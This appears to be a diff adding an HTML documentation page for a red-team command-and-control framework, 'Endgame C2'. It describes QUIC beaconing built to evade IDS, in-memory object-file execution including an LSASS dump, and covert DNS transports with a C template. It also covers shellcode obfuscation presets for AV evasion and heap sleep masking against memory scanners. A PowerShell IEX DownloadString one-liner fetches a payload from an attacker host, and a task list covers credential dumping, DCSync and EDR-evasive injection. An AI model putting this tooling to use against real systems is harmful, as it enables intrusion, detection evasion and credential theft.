+    <div class="code-block-hdr"><span class="code-block-lang">bash</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre># Via server binary
+./bin/c2-server new-operator -name alice -port 31337
+
+# Via the included Python script (no server restart needed)
+python3 scripts/gen_operator_profile.py --name alice</pre>
+  </div>
+  <div class="callout warn"><span class="callout-icon">⚠</span><div class="callout-body"><strong>Profile security</strong> — the profile contains the operator's private key. Distribute it over an encrypted channel and store it at <code>chmod 600</code>. Never commit it to version control.</div></div>
+  <h2>Regenerating after a CA rotation</h2>
+  <p>If the server CA changes (e.g. after a reinstall), existing profiles will fail with <em>unknown certificate authority</em>. Regenerate all profiles:</p>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">bash</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre>python3 scripts/gen_operator_profile.py --name admin --overwrite</pre>
+  </div>
+</section>
+
+<!-- LISTENER QUIC -->
+<section class="topic" id="t-listener-quic">
+  <div class="eyebrow">Listeners</div>
+  <h1>QUIC / HTTP3 Listener <span class="tag tag-new">NEW</span></h1>
+  <p class="lead">The QUIC listener transports beacon traffic over UDP/QUIC (HTTP/3), bypassing TCP-based network inspection and evading many IDS/proxy solutions.</p>
+  <h2>Why QUIC</h2>
+  <ul>
+    <li>Runs over <strong>UDP</strong> — most corporate IDS/NGFW solutions only inspect TCP traffic</li>
+    <li>TLS 1.3 is mandatory inside QUIC — no cleartext inspection</li>
+    <li>Firewalls often classify UDP/443 as video streaming (YouTube, Google Meet) and allow it</li>
+    <li>Connection establishment is <strong>1-RTT</strong> vs 3-RTT for TCP+TLS — faster initial check-in</li>
+  </ul>
+  <h2>Start a QUIC listener</h2>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">bash</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre>./bin/c2-server -quic-port 8444 ...</pre>
+  </div>
+  <p>Or use the <strong>+ New Listener</strong> dialog and select <strong>QUIC</strong> as protocol.</p>
+  <h2>Automatic HTTPS fallback</h2>
+  <p>Agents built with <code>transport=quic</code> include a fallback mechanism. After <strong>3 consecutive UDP failures</strong>, the agent automatically switches to HTTPS and continues beaconing — no operator intervention needed.</p>
+
+  <div class="screenshot">
+    <div class="app-chrome">
+      <div class="app-titlebar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><div class="title">Payload Builder — Transport</div></div>
+      <div style="padding:20px;background:#0b0d11;font-family:var(--mono)">
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
+          <div>
+            <div style="font-size:10px;font-weight:700;letter-spacing:.8px;color:#4a5568;text-transform:uppercase;margin-bottom:8px">Transport</div>
+            <div style="display:flex;gap:4px;flex-wrap:wrap">
+              <div style="padding:6px 12px;background:#1a1e27;border:1px solid #252a35;border-radius:5px;font-size:11px;color:#8a94a8;font-family:Inter,sans-serif">HTTP</div>
+              <div style="padding:6px 12px;background:#1a1e27;border:1px solid #252a35;border-radius:5px;font-size:11px;color:#8a94a8;font-family:Inter,sans-serif">HTTPS</div>
+              <div style="padding:6px 12px;background:#1a1e27;border:1px solid #252a35;border-radius:5px;font-size:11px;color:#8a94a8;font-family:Inter,sans-serif">mTLS</div>
+              <div style="padding:6px 12px;background:rgba(52,211,153,.15);border:1px solid rgba(52,211,153,.4);border-radius:5px;font-size:11px;color:#34d399;font-weight:600;font-family:Inter,sans-serif">QUIC</div>
+              <div style="padding:6px 12px;background:#1a1e27;border:1px solid #252a35;border-radius:5px;font-size:11px;color:#8a94a8;font-family:Inter,sans-serif">SMB</div>
+              <div style="padding:6px 12px;background:#1a1e27;border:1px solid #252a35;border-radius:5px;font-size:11px;color:#8a94a8;font-family:Inter,sans-serif">TCP</div>
+            </div>
+          </div>
+          <div>
+            <div style="font-size:10px;font-weight:700;letter-spacing:.8px;color:#4a5568;text-transform:uppercase;margin-bottom:8px">QUIC Port</div>
+            <input style="width:100%;padding:7px 10px;background:#1a1e27;border:1px solid rgba(52,211,153,.4);border-radius:5px;color:#34d399;font-family:monospace;font-size:13px" value="8444">
+          </div>
+        </div>
+        <div style="margin-top:14px">
+          <div style="font-size:10px;font-weight:700;letter-spacing:.8px;color:#4a5568;text-transform:uppercase;margin-bottom:8px">HTTPS Fallback URL</div>
+          <input style="width:340px;padding:7px 10px;background:#1a1e27;border:1px solid #252a35;border-radius:5px;color:#8a94a8;font-family:monospace;font-size:13px" value="https://10.10.10.99:443">
+          <div style="font-size:11px;color:#4a5568;margin-top:5px;font-family:Inter,sans-serif">Activates after 3 consecutive QUIC failures</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <p class="screenshot-caption">Figure 2 — Payload Builder with QUIC transport and HTTPS fallback URL configured</p>
+
+  <table class="tbl">
+    <tr><th>Build var</th><th>Description</th></tr>
+    <tr><td>QUICServerURL</td><td>Primary QUIC endpoint, e.g. <code>https://host:8444</code></td></tr>
+    <tr><td>QUICFallbackURL</td><td>HTTPS URL to fall back to if QUIC fails. Defaults to <code>ServerURL</code> with <code>https://</code></td></tr>
+  </table>
+</section>
+
+<!-- BOF OVERVIEW -->
+<section class="topic" id="t-bof-overview">
+  <div class="eyebrow">BOF</div>
+  <h1>Beacon Object Files</h1>
+  <p class="lead">BOFs are COFF x64 object files that execute in the agent's process context with direct access to the Windows API — no injection, no new process.</p>
+  <h2>How BOFs work</h2>
+  <p>When the agent receives a <code>BOF_RUN</code> task, it:</p>
+  <ol>
+    <li>Copies the COFF bytes into a new RWX memory region</li>
+    <li>Resolves all import symbols against the process's loaded modules</li>
+    <li>Calls the exported <code>go(char *args, int argslen)</code> function</li>
+    <li>Captures any <code>BeaconOutput()</code> calls and sends them back as task output</li>
+    <li>Frees the memory and returns</li>
+  </ol>
+  <div class="callout tip"><span class="callout-icon">✓</span><div class="callout-body"><strong>CS compatibility</strong> — Endgame BOFs are compatible with the Cobalt Strike BOF API. Any BOF written for CS will run unmodified, including the <code>beacon.h</code> helper macros.</div></div>
+  <h2>Installing BOFs</h2>
+  <p>BOFs are installed through the operator client, not the server. Two methods:</p>
+  <ul>
+    <li><strong>CLI</strong>: <code>bof install /path/to/my.o</code> in the interactive console</li>
+    <li><strong>UI</strong>: Settings → 💾 BOFs → <em>Catalog</em> tab → drag-and-drop</li>
+  </ul>
+
+  <div class="screenshot">
+    <div class="app-chrome">
+      <div class="app-titlebar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><div class="title">Settings — BOF Manager</div></div>
+      <div class="app-flex">
+        <div class="app-panel">
+          <div class="app-panel-hdr">BOF Manager</div>
+          <div class="app-panel-item sel">💾 Installed (12)</div>
+          <div class="app-panel-item">🗂 Catalog</div>
+          <div class="app-panel-item">📤 Upload</div>
+        </div>
+        <div style="flex:1;background:#0b0d11;padding:14px">
+          <table class="app-table" style="width:100%">
+            <tr><th>Name</th><th>Description</th><th>Args</th><th></th></tr>
+            <tr><td class="host">whoami</td><td style="color:#8a94a8;font-family:Inter,sans-serif">Current user and groups</td><td style="color:#4a5568;font-family:monospace;font-size:10px">—</td><td><button style="font-size:10px;padding:2px 8px;background:rgba(200,16,46,.1);border:1px solid rgba(200,16,46,.3);color:#c8102e;border-radius:4px;cursor:pointer;font-family:Inter,sans-serif">Run</button></td></tr>
+            <tr><td class="host">nanodump</td><td style="color:#8a94a8;font-family:Inter,sans-serif">LSASS minidump via MiniDumpWriteDump</td><td style="color:#4a5568;font-family:monospace;font-size:10px">pid:int</td><td><button style="font-size:10px;padding:2px 8px;background:rgba(200,16,46,.1);border:1px solid rgba(200,16,46,.3);color:#c8102e;border-radius:4px;cursor:pointer;font-family:Inter,sans-serif">Run</button></td></tr>
+            <tr><td class="host">seatbelt</td><td style="color:#8a94a8;font-family:Inter,sans-serif">Host enumeration (all checks)</td><td style="color:#4a5568;font-family:monospace;font-size:10px">check:str</td><td><button style="font-size:10px;padding:2px 8px;background:rgba(200,16,46,.1);border:1px solid rgba(200,16,46,.3);color:#c8102e;border-radius:4px;cursor:pointer;font-family:Inter,sans-serif">Run</button></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+  <p class="screenshot-caption">Figure 3 — BOF Manager showing installed BOFs with run controls</p>
+</section>
+
+<!-- UDC2 -->
+<section class="topic" id="t-udc2">
+  <div class="eyebrow">Covert Channels</div>
+  <h1>UDC2 — User-Defined C2 Transport</h1>
+  <p class="lead">Replace the agent's built-in HTTP transport at runtime with a custom BOF that delivers beacon data over any channel — DNS, ICMP, Slack, named pipes, carrier pigeons.</p>
+  <h2>How it works</h2>
+  <p>When a <code>UDC2_LOAD</code> task is delivered, the agent:</p>
+  <ol>
+    <li>Loads the COFF into memory and resolves its imports</li>
+    <li>Replaces its internal <code>http.RoundTripper</code> with <code>udc2RoundTripper</code></li>
+    <li>On every beacon cycle, packs the HTTP request body as a binary BOF argument and calls the BOF's <code>go()</code> function</li>
+    <li>The BOF sends the data over its custom channel and returns the server response via <code>BeaconOutput</code></li>
+    <li>The agent decrypts the response normally — the transport layer is fully opaque</li>
+  </ol>
+
+  <div class="screenshot">
+    <div class="app-chrome">
+      <div class="app-titlebar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><div class="title">Console — castelblack / Administrator</div></div>
+      <div class="app-console">
+        <div><span class="cons-prompt">[endgame]</span> <span class="cons-cmd">udc2 load /opt/bofs/dns_transport.o</span></div>
+        <div class="cons-out">Sending UDC2_LOAD task (7,432 bytes)…</div>
+        <div class="cons-ok">[+] UDC2 transport loaded — 7432 bytes</div>
+        <div class="cons-ok">[+] DNS transport active. Next beacon via DNS TXT queries to c2.example.com</div>
+        <div style="margin-top:8px"><span class="cons-prompt">[endgame]</span> <span class="cons-cmd">shell whoami</span></div>
+        <div class="cons-out">Tasked agent via DNS channel</div>
+        <div class="cons-ok">castelblack\Administrator</div>
+      </div>
+    </div>
+  </div>
+  <p class="screenshot-caption">Figure 4 — Loading a DNS transport BOF via UDC2_LOAD; subsequent commands transit the custom channel</p>
+
+  <h2>Writing a UDC2 BOF</h2>
+  <p>A UDC2 transport BOF exports a standard <code>go(char *args, int argslen)</code> entry point. The agent passes the beacon HTTP body as binary argument data.</p>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">c</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre>#include &lt;windows.h&gt;
+#include "beacon.h"  // standard CS/Endgame BOF API
+
+void go(char *args, int argslen) {
+    datap parser;
+    BeaconDataParse(&parser, args, argslen);
+
+    int   dataLen = 0;
+    char *data = BeaconDataExtract(&parser, &dataLen);
+
+    // --- send `data` (dataLen bytes) over your custom channel ---
+    // e.g. DNS exfil, ICMP, HTTP to a redirector, named pipe...
+    char *response = my_custom_send(data, dataLen);
+    int   respLen  = my_custom_recv(response);
+
+    // Return the server's response
+    BeaconOutput(CALLBACK_OUTPUT, response, respLen);
+}</pre>
+  </div>
+  <div class="callout warn"><span class="callout-icon">⚠</span><div class="callout-body"><strong>The BOF stays resident</strong> — unlike a regular BOF which is freed after execution, the UDC2 BOF remains loaded for the lifetime of the agent process. Design accordingly: avoid heavy allocations that won't be freed.</div></div>
+</section>
+
+<!-- OBFUSCATION PIPELINE -->
+<section class="topic" id="t-obf-pipeline">
+  <div class="eyebrow">Evasion & OPSEC</div>
+  <h1>Obfuscation Pipeline</h1>
+  <p class="lead">Apply an ordered chain of encoding and encryption steps to the agent shellcode at build time. The agent decodes in reverse order at runtime before executing.</p>
+  <h2>Available steps</h2>
+  <table class="tbl">
+    <tr><th>Step</th><th>Description</th><th>Notes</th></tr>
+    <tr><td>sgn</td><td>Shikata Ga Nai polymorphic x64 encoder</td><td>Output is larger; breaks static signatures</td></tr>
+    <tr><td>xor</td><td>XOR with a random 4-byte key (prepended)</td><td>Fast; simple but effective against static AV</td></tr>
+    <tr><td>zlib</td><td>zlib compress</td><td>Reduces size; changes byte distribution</td></tr>
+    <tr><td>b64</td><td>Base64 encode</td><td>Useful before network transport</td></tr>
+    <tr><td>aes</td><td>AES-256-GCM encrypt with per-build key</td><td>Strong; requires <code>ObfuscationKey</code> build var</td></tr>
+  </table>
+  <h2>Configuring a pipeline</h2>
+  <p>In the Payload Builder, open the <strong>OPSEC</strong> tab and select a preset or enter a custom pipeline:</p>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">text</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre># Preset: Aggressive (maximum evasion, larger payload)
+sgn,xor,zlib,aes
+
+# Preset: Balanced
+xor,zlib,b64
+
+# Preset: Minimal (fast, small)
+xor,b64</pre>
+  </div>
+  <p>The pipeline string is injected as an <code>ldflags</code> build variable (<code>ObfPipeline</code>). The agent reads it at startup and applies <code>pipelineDeobfuscate()</code> before shellcode execution.</p>
+</section>
+
+<!-- MALLEABLE C2 -->
+<section class="topic" id="t-malleable-c2">
+  <div class="eyebrow">Covert Channels</div>
+  <h1>Malleable C2 — Live Profile Push</h1>
+  <p class="lead">Update a running agent's HTTP communication profile without redeployment. Change the User-Agent, beacon URIs, and custom headers in real time to adapt to network defenses.</p>
+  <h2>Push a profile update</h2>
+  <p>Right-click any agent → <strong>📡 Push Profile</strong>, or use the API:</p>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">bash</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre>curl -X POST https://127.0.0.1:31337/api/agents/{id}/push-profile \
+  --cert ~/.endgame/certs/client.crt \
+  --key  ~/.endgame/certs/client.key \
+  -d '{
+    "user_agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "beacon_uris":  "/search,/api/v1/data,/cdn/assets",
+    "http_headers": "X-Request-ID: {guid}\nAccept-Language: en-US,en;q=0.9"
+  }'</pre>
+  </div>
+  <h2>Profile fields</h2>
+  <table class="tbl">
+    <tr><th>Field</th><th>Description</th></tr>
+    <tr><td>user_agent</td><td>HTTP User-Agent header for all beacon requests</td></tr>
+    <tr><td>beacon_uris</td><td>Comma-separated list of URIs the agent cycles through for GET check-ins</td></tr>
+    <tr><td>http_headers</td><td>Newline-separated custom headers added to every request</td></tr>
+    <tr><td>response_wrap</td><td>Expected response wrapper (for CDN/redirector response shaping)</td></tr>
+  </table>
+</section>
+
+<!-- PEER FEDERATION -->
+<section class="topic" id="t-peer-federation">
+  <div class="eyebrow">Team Operations</div>
+  <h1>Peer Federation</h1>
+  <p class="lead">Link multiple Endgame teamservers so your team sees a unified agent inventory across infrastructure — useful for large engagements with geographically distributed C2 servers.</p>
+
+  <div class="screenshot">
+    <div class="app-chrome">
+      <div class="app-titlebar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><div class="title">Settings — Peer Servers</div></div>
+      <div class="app-flex">
+        <div class="app-panel">
+          <div class="app-panel-hdr">Team Servers</div>
+          <div class="app-panel-item sel">🔗 Peers (2)</div>
+          <div class="app-panel-item">⚙ Sync Config</div>
+        </div>
+        <div style="flex:1;background:#0b0d11;padding:14px">
+          <div class="app-toolbar" style="margin-bottom:12px">
+            <button class="tbtn primary">+ Add Peer</button>
+            <button class="tbtn">Sync All</button>
+          </div>
+          <table class="app-table">
+            <tr><th>Name</th><th>URL</th><th>Agents</th><th>Last sync</th><th>Status</th></tr>
+            <tr><td class="host">eu-c2</td><td style="color:#4a5568;font-size:10px;font-family:monospace">https://185.x.x.x:31337</td><td style="color:#22c55e">14</td><td style="color:#4a5568">3s ago</td><td><span class="pill pill-live">Online</span></td></tr>
+            <tr><td class="host">us-west-c2</td><td style="color:#4a5568;font-size:10px;font-family:monospace">https://52.x.x.x:31337</td><td style="color:#22c55e">8</td><td style="color:#4a5568">5s ago</td><td><span class="pill pill-live">Online</span></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+  <p class="screenshot-caption">Figure 5 — Peer Federation panel showing two linked teamservers with live agent counts</p>
+
+  <h2>How it works</h2>
+  <p>Each server runs a 30-second background sync goroutine that fetches <code>/api/agents</code> from every configured peer. Peer agents are merged into the local inventory with a <code>peer:{name}:{originalID}</code> prefixed ID and shown with a 🔗 badge in the Agents tab. They are read-only — you cannot task peer agents from your instance.</p>
+  <h2>Adding a peer</h2>
+  <div class="steps">
+    <div class="step"><div class="step-body"><strong>Go to Settings → 🔗 Peers</strong><p>Open the settings panel and navigate to the Peers section.</p></div></div>
+    <div class="step"><div class="step-body"><strong>Click + Add Peer</strong><p>Enter the peer server's URL and API token. The token is generated on the peer server.</p></div></div>
+    <div class="step"><div class="step-body"><strong>Click Sync</strong><p>The first sync runs immediately. Peer agents appear in your Agents tab within seconds.</p></div></div>
+  </div>
+</section>
+
+<!-- SCRIPTED DELIVERY -->
+<section class="topic" id="t-scripted-delivery">
+  <div class="eyebrow">Team Operations</div>
+  <h1>Scripted Delivery</h1>
+  <p class="lead">Host payloads on the C2 server and generate one-liner delivery scripts. Every victim download is tracked with IP, User-Agent, and timestamp.</p>
+
+  <div class="screenshot">
+    <div class="app-chrome">
+      <div class="app-titlebar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><div class="title">Attack — Scripted Delivery</div></div>
+      <div style="padding:16px;background:#0b0d11;font-family:Inter,sans-serif">
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">
+          <div>
+            <div style="font-size:10px;font-weight:700;color:#4a5568;letter-spacing:.8px;text-transform:uppercase;margin-bottom:6px">Script Host</div>
+            <input style="width:100%;padding:7px 10px;background:#1a1e27;border:1px solid #252a35;border-radius:5px;color:#e2e6f0;font-family:monospace;font-size:12px" value="10.10.14.5">
+          </div>
+          <div>
+            <div style="font-size:10px;font-weight:700;color:#4a5568;letter-spacing:.8px;text-transform:uppercase;margin-bottom:6px">Port <span style="color:#22c55e;font-size:9px">● auto-filled from listener</span></div>
+            <input style="width:100%;padding:7px 10px;background:#1a1e27;border:1px solid rgba(34,197,94,.3);border-radius:5px;color:#22c55e;font-family:monospace;font-size:12px" value="8080">
+          </div>
+        </div>
+        <div style="background:#1a1e27;border:1px solid #252a35;border-radius:8px;padding:12px;margin-bottom:12px">
+          <div style="font-size:10px;color:#4a5568;margin-bottom:6px">PowerShell one-liner</div>
+          <div style="font-family:monospace;font-size:11px;color:#93c5fd">IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/s/a1b2c3/payload.ps1')</div>
+        </div>
+        <div style="background:#13161c;border:1px solid #252a35;border-radius:8px;overflow:hidden">
+          <div style="padding:8px 12px;border-bottom:1px solid #252a35;display:flex;justify-content:space-between;align-items:center">
+            <div style="font-size:10px;font-weight:700;color:#4a5568;letter-spacing:.8px;text-transform:uppercase">Hosted Files</div>
+            <button style="font-size:10px;padding:3px 8px;background:rgba(200,16,46,.1);border:1px solid rgba(200,16,46,.3);color:#c8102e;border-radius:4px;cursor:pointer">+ Host File</button>
+          </div>
+          <table class="app-table">
+            <tr><th>File</th><th>URI</th><th>Hits</th><th></th></tr>
+            <tr><td class="host">agent.exe</td><td style="color:#4a5568;font-family:monospace;font-size:10px">/s/a1b2c3/agent.exe</td><td><span style="font-size:11px;background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3);border-radius:4px;padding:1px 7px;font-family:Inter,sans-serif">▸ 3 hits</span></td><td><button style="font-size:10px;padding:2px 8px;background:#1a1e27;border:1px solid #252a35;border-radius:4px;color:#8a94a8;cursor:pointer;font-family:Inter,sans-serif">Hits</button></td></tr>
+            <tr><td class="host">loader.ps1</td><td style="color:#4a5568;font-family:monospace;font-size:10px">/s/d4e5f6/loader.ps1</td><td><span style="font-size:11px;background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3);border-radius:4px;padding:1px 7px;font-family:Inter,sans-serif">▸ 1 hit</span></td><td><button style="font-size:10px;padding:2px 8px;background:#1a1e27;border:1px solid #252a35;border-radius:4px;color:#8a94a8;cursor:pointer;font-family:Inter,sans-serif">Hits</button></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+  <p class="screenshot-caption">Figure 6 — Scripted Delivery panel with hit tracking and auto-filled listener port</p>
+
+  <h2>Hit tracking</h2>
+  <p>Every GET request to a hosted file is logged. Click <strong>Hits</strong> to view the full delivery log for that file:</p>
+  <table class="tbl">
+    <tr><th>Field</th><th>Description</th></tr>
+    <tr><td>IP</td><td>Source IP of the victim machine</td></tr>
+    <tr><td>User-Agent</td><td>Browser or script engine that fetched the file</td></tr>
+    <tr><td>Timestamp</td><td>UTC time of the download</td></tr>
+    <tr><td>Hit count</td><td>Total fetches; useful to detect sandbox re-executions</td></tr>
+  </table>
+</section>
+
+<!-- SLEEP MASK -->
+<section class="topic" id="t-sleep-mask">
+  <div class="eyebrow">Evasion & OPSEC</div>
+  <h1>Sleep Mask</h1>
+  <p class="lead">Between beacon cycles the agent encrypts its own heap and code sections in memory and enters a wait state — making it invisible to memory scanners that run during sleep.</p>
+  <h2>Full heap mask</h2>
+  <p>Endgame's <code>sleepMaskFull()</code> uses <code>VirtualQuery</code> to walk all committed private memory regions and XOR-encrypts each one before calling <code>WaitForSingleObject</code>. On wake-up, regions are decrypted in reverse order before the next beacon cycle executes.</p>
+  <div class="callout info"><span class="callout-icon">ℹ</span><div class="callout-body"><strong>Parity with CS 4.11</strong> — the full heap sleep mask matches the <em>Beacon Memory Indicators</em> mitigations introduced in Cobalt Strike 4.9.</div></div>
+  <h2>Configuring sleep mask</h2>
+  <p>Sleep mask is enabled by default for all agents. To configure the mode:</p>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">bash</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre># In Payload Builder → OPSEC tab
+Sleep Mask: Full heap (recommended)
+           Code section only
+           Disabled</pre>
+  </div>
+</section>
+
+<!-- API REFERENCE -->
+<section class="topic" id="t-api-ref">
+  <div class="eyebrow">Reference</div>
+  <h1>Operator API</h1>
+  <p class="lead">The teamserver exposes a REST API over mTLS at port 31337. All responses are wrapped in <code>{"data":…,"ok":true}</code>.</p>
+  <h2>Authentication</h2>
+  <p>Every request must present a valid operator client certificate. Use <code>--cert</code> and <code>--key</code> with curl, or load the profile JSON in any HTTP client that supports mTLS.</p>
+  <h2>Core endpoints</h2>
+  <table class="tbl">
+    <tr><th>Method</th><th>Path</th><th>Description</th></tr>
+    <tr><td>GET</td><td>/api/agents</td><td>List all agents (includes peer agents)</td></tr>
+    <tr><td>GET</td><td>/api/agents/{id}</td><td>Single agent detail</td></tr>
+    <tr><td>POST</td><td>/api/agents/{id}/tasks</td><td>Queue a task</td></tr>
+    <tr><td>POST</td><td>/api/agents/{id}/push-profile</td><td>Push a Malleable C2 profile update</td></tr>
+    <tr><td>GET</td><td>/api/listeners</td><td>List listeners</td></tr>
+    <tr><td>POST</td><td>/api/listeners</td><td>Create a listener</td></tr>
+    <tr><td>GET</td><td>/api/credentials</td><td>Captured credentials (merged with peers)</td></tr>
+    <tr><td>GET</td><td>/api/peers</td><td>List peer servers</td></tr>
+    <tr><td>POST</td><td>/api/peers</td><td>Add a peer server</td></tr>
+    <tr><td>POST</td><td>/api/build</td><td>Build a payload (returns binary)</td></tr>
+  </table>
+  <h2>Task payload format</h2>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">json</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre>{
+  "type":        "SHELL",
+  "args":        {"cmd": "whoami /all"},
+  "payload_b64": null
+}</pre>
+  </div>
+</section>
+
+<!-- TASK TYPES -->
+<section class="topic" id="t-task-types">
+  <div class="eyebrow">Reference</div>
+  <h1>Task Type Reference</h1>
+  <p class="lead">Complete list of task types accepted by the agent.</p>
+  <table class="tbl">
+    <tr><th>Type</th><th>Platform</th><th>Description</th></tr>
+    <tr><td>SHELL</td><td>All</td><td>Execute command via cmd.exe / sh</td></tr>
+    <tr><td>POWERSHELL</td><td>Win</td><td>Execute PowerShell expression (AMSI-patched)</td></tr>
+    <tr><td>UPLOAD</td><td>All</td><td>Upload file to agent (base64 payload)</td></tr>
+    <tr><td>DOWNLOAD</td><td>All</td><td>Download file from agent</td></tr>
+    <tr><td>BOF_RUN</td><td>Win</td><td>Execute a BOF (COFF x64) in-process</td></tr>
+    <tr><td>BOF_RUN_ASYNC</td><td>Win</td><td>BOF in goroutine — ACK immediate, result deferred</td></tr>
+    <tr><td>UDC2_LOAD</td><td>Win</td><td>Load a custom C2 transport BOF at runtime</td></tr>
+    <tr><td>INJECT</td><td>Win</td><td>Inject shellcode into a remote process (configurable method)</td></tr>
+    <tr><td>INJECT_OBFSTC</td><td>Win</td><td>ObfSetThreadContext injection (EDR-evasive)</td></tr>
+    <tr><td>SPAWN</td><td>Win</td><td>Spawn a new agent process</td></tr>
+    <tr><td>MIGRATE</td><td>Win</td><td>Migrate agent into another process</td></tr>
+    <tr><td>CONFIG</td><td>All</td><td>Update sleep/jitter and Malleable C2 profile fields</td></tr>
+    <tr><td>SLEEP</td><td>All</td><td>Set sleep interval and jitter</td></tr>
+    <tr><td>SOCKS</td><td>All</td><td>Start/stop SOCKS5 proxy</td></tr>
+    <tr><td>PORTSCAN</td><td>All</td><td>TCP port scan</td></tr>
+    <tr><td>KILL</td><td>All</td><td>Terminate agent process</td></tr>
+    <tr><td>GETSYSTEM</td><td>Win</td><td>Privilege escalation to SYSTEM</td></tr>
+    <tr><td>HASHDUMP</td><td>Win</td><td>Dump SAM/NTDS hashes</td></tr>
+    <tr><td>DCSYNC</td><td>Win</td><td>DCSync via MS-DRSR (mimikatz)</td></tr>
+    <tr><td>KERBEROAST</td><td>Win</td><td>Request service tickets for offline cracking</td></tr>
+    <tr><td>ADCS_REQUEST</td><td>Win</td><td>Request ADCS certificate (ESC1-8 abuse)</td></tr>
+  </table>
+</section>
+
+</main>
+
+<!-- FOOTER -->
+<footer id="footer">
+  <div>© 2025 Endgame C2 Framework — Professional Edition</div>
+  <div style="display:flex;gap:20px">
+    <a href="https://endgamec2framework.com/professional.html">← Professional</a>
+    <a href="https://endgamec2framework.com">Home</a>
+    <a href="mailto:REDTEAMNEW@nunsys.com">Contact</a>
+  </div>
+</footer>
+
+<!-- SEARCH OVERLAY -->
+<div id="search-overlay" onclick="if(event.target===this)closeSearch()">
+  <div id="search-box">
+    <input id="search-input" placeholder="Search documentation…" oninput="doSearch(this.value)" onkeydown="if(event.key==='Escape')closeSearch()">
+    <div class="search-results" id="search-results">
+      <div class="search-empty">Start typing to search…</div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── NAV ──
+const topics = {
+  'welcome':'t-welcome','whats-new':'t-whats-new','architecture':'t-welcome',
+  'install':'t-install','profiles':'t-profiles','first-launch':'t-install','licensing':'t-install',
+  'listeners-overview':'t-listener-quic','listener-http':'t-listener-quic','listener-https':'t-listener-quic',
+  'listener-mtls':'t-listener-quic','listener-tcp':'t-listener-quic','listener-smb':'t-listener-quic','listener-quic':'t-listener-quic',
+  'agents-overview':'t-bof-overview','agent-go':'t-bof-overview','agent-nim':'t-bof-overview',
+  'payload-builder':'t-listener-quic','agent-lifecycle':'t-bof-overview',
+  'commands-overview':'t-task-types','cmd-shell':'t-task-types','cmd-files':'t-task-types',
+  'cmd-process':'t-task-types','cmd-lateral':'t-task-types','cmd-persistence':'t-task-types','cmd-privesc':'t-task-types',
+  'evasion-overview':'t-sleep-mask','sleep-mask':'t-sleep-mask','injection-methods':'t-sleep-mask',
+  'etw-bypass':'t-sleep-mask','amsi-bypass':'t-sleep-mask','eaf-bypass':'t-sleep-mask','obf-pipeline':'t-obf-pipeline',
+  'bof-overview':'t-bof-overview','bof-install':'t-bof-overview','bof-run':'t-bof-overview','bof-write':'t-bof-overview','bof-async':'t-bof-overview',
+  'udc2':'t-udc2','quic-channel':'t-listener-quic','smb-pivot':'t-bof-overview','malleable-c2':'t-malleable-c2',
+  'peer-federation':'t-peer-federation','scripted-delivery':'t-scripted-delivery','reporting':'t-peer-federation',
+  'api-ref':'t-api-ref','task-types':'t-task-types','transport-ref':'t-listener-quic'
+};
+let currentTopic = 'welcome';
+
+function show(id) {
+  const sectionId = topics[id] || 't-welcome';
+  document.querySelectorAll('.topic').forEach(t => t.classList.remove('active'));
+  const sec = document.getElementById(sectionId);
+  if (sec) sec.classList.add('active');
+  document.querySelectorAll('.nav-item').forEach(el => {
+    el.classList.toggle('active', el.getAttribute('onclick') === `show('${id}')`);
+  });
+  currentTopic = id;
+  try { localStorage.setItem('eg-topic', id); } catch(e){}
+  document.getElementById('main').scrollTop = 0;
+  window.scrollTo(0,0);
+  document.getElementById('sidebar').classList.remove('open');
+}
+
+function toggleSection(hdr) {
+  hdr.closest('.nav-section').classList.toggle('collapsed');
+}
+
+// Restore last topic
+try {
+  const saved = localStorage.getItem('eg-topic');
+  if (saved && topics[saved]) show(saved);
+} catch(e) {}
+
+// ── THEME ──
+function toggleTheme() {
+  const root = document.documentElement;
+  const cur = root.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  root.setAttribute('data-theme', next);
+  try { localStorage.setItem('eg-theme', next); } catch(e){}
+}
+try {
+  const t = localStorage.getItem('eg-theme');
+  if (t) document.documentElement.setAttribute('data-theme', t);
+} catch(e){}
+
+// ── SEARCH ──
+const INDEX = [
+  {section:'Introduction', title:'Welcome', id:'welcome', snippet:'Full-spectrum C2 framework for professional red team operations'},
+  {section:'Introduction', title:"What's New in v2.1", id:'whats-new', snippet:'QUIC transport, UDC2, obfuscation pipeline, peer federation, hit tracking'},
